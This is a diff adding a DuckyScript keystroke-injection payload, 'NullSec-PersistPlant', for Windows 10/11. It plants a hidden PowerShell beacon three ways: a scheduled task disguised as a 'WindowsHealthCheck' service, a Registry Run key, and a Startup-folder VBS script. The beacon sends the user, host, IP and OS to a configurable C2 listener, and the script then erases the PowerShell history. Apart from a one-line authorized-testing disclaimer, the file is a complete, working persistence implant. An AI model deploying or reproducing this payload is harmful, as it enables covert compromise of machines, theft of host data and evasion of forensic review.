@@ -1,0 +1,101 @@
+REM ################################################
+REM # NullSec-PersistPlant                         #
+REM # Covert Persistence Mechanism Installer        #
+REM # Target: Windows 10/11                         #
+REM # Author: NullSec (github.com/bad-antics)       #
+REM ################################################
+REM
+REM Installs multiple persistence mechanisms:
+REM - Scheduled Task (runs at logon)
+REM - Registry Run key
+REM - Startup folder shortcut
+REM
+REM The "implant" is a configurable PowerShell beacon
+REM that phones home to your listener on each trigger.
+REM
+REM For authorized penetration testing only.
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+
+REM === CONFIGURE YOUR C2/LISTENER HERE ===
+STRING $C2='YOUR_LISTENER_URL';
+ENTER
+
+REM === Build the beacon payload ===
+STRING $beacon = @'
+ENTER
+STRING $u = $env:USERNAME; $h = $env:COMPUTERNAME
+ENTER
+STRING $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127.*'} | Select -First 1).IPAddress
+ENTER
+STRING $os = (Get-CimInstance Win32_OperatingSystem).Caption
+ENTER
+STRING $body = @{user=$u;host=$h;ip=$ip;os=$os;time=(Get-Date -f 'yyyy-MM-dd HH:mm:ss')} | ConvertTo-Json
+ENTER
+STRING try { Invoke-RestMethod -Uri $C2 -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 } catch {}
+ENTER
+STRING '@;
+ENTER
+
+REM --- Encode the beacon for persistence ---
+STRING $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($beacon));
+ENTER
+STRING $cmd = "powershell -w hidden -ep bypass -enc $encoded";
+ENTER
+
+REM === Method 1: Scheduled Task ===
+STRING $taskName = 'WindowsHealthCheck';
+ENTER
+STRING $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-w hidden -ep bypass -enc $encoded";
+ENTER
+STRING $trigger1 = New-ScheduledTaskTrigger -AtLogon;
+ENTER
+STRING $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 4);
+ENTER
+STRING $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;
+ENTER
+STRING Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger1,$trigger2 -Settings $settings -Description 'Windows Health Monitoring Service' -Force 2>$null;
+ENTER
+
+REM === Method 2: Registry Run Key (HKCU - no admin needed) ===
+STRING $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run';
+ENTER
+STRING Set-ItemProperty -Path $regPath -Name 'WindowsHealthSvc' -Value $cmd -Force 2>$null;
+ENTER
+
+REM === Method 3: Startup Folder ===
+STRING $startupPath = [Environment]::GetFolderPath('Startup');
+ENTER
+STRING $vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`r`n" + 'WshShell.Run "' + $cmd + '", 0, False';
+ENTER
+STRING $vbsContent | Out-File "$startupPath\HealthCheck.vbs" -Encoding ASCII -Force 2>$null;
+ENTER
+
+REM --- Confirm installation ---
+STRING $methods = @();
+ENTER
+STRING if(Get-ScheduledTask -TaskName $taskName -ea SilentlyContinue){$methods += 'ScheduledTask'}
+ENTER
+STRING if((Get-ItemProperty $regPath -ea SilentlyContinue).WindowsHealthSvc){$methods += 'Registry'}
+ENTER
+STRING if(Test-Path "$startupPath\HealthCheck.vbs"){$methods += 'StartupVBS'}
+ENTER
+
+REM --- Report back ---
+STRING $report = @{host=$env:COMPUTERNAME;user=$env:USERNAME;methods=($methods -join ',');status='planted'} | ConvertTo-Json;
+ENTER
+STRING irm $C2 -Method Post -Body $report -ContentType 'application/json' -ea SilentlyContinue;
+ENTER
+
+REM --- Cleanup evidence ---
+STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -ea SilentlyContinue;
+ENTER
+STRING [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
+ENTER
+STRING exit
+ENTER
